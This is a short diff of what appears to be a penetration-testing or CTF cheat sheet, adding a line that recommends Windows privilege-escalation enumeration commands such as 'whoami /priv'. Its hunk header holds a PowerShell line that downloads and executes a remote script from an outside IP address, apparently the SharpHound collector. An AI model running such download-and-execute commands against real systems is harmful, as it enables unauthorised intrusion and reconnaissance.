@@ -69,6 +69,7 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1')
 
 ## PE
 ### Windows
+First, pls check some command like `net user %username%`, `whoami /all`, `whoami /priv`
 #### Enum
 ```
 tasklist /svc
